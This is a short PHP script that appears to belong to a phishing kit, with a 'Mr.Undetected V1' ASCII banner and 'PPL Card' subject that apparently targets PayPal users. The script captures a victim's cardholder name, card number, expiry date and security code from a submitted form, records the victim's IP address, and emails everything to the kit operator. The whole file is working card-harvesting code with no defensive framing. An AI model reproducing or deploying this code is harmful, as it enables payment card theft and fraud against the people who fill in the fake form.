<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 
include 'function.php';
include '../../email.php';
include("system.php");

$_SESSION['_NameOnCard_'] = $_POST['NameOnCard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Card | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>